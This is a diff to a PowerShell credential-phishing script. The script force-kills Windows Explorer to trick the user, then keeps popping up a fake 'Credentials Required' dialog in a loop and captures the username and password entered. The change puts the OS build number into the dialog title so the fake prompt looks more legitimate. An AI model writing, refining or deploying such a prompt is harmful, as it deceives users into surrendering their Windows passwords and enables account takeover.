@@ -23,8 +23,7 @@ Standalone Powershell script that will promp the current user for a valid creden
 #>
 
 
-
-## Stop explorer to trick user
+$OSVersion = (Get-WmiObject Win32_OperatingSystem).Version
 taskkill /f /im explorer.exe
 $timestomp = $null
 $account = $null
@@ -41,7 +40,7 @@ while ($counter -lt '1000000000')
   $DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine)
 	
   $account=[System.Security.Principal.WindowsIdentity]::GetCurrent().name
-  $credential = $host.ui.PromptForCredential("WorkStation - Credentials Required", "Please enter your username and password.", $Account, "NetBiosUserName")
+  $credential = $host.ui.PromptForCredential("Build: $OSVersion - Credentials Required", "Please enter your username and password.", $Account, "NetBiosUserName")
   #$validate = $DS.ValidateCredentials($Account, $credential.GetNetworkCredential().password)
 
     $user = $credential.GetNetworkCredential().username;
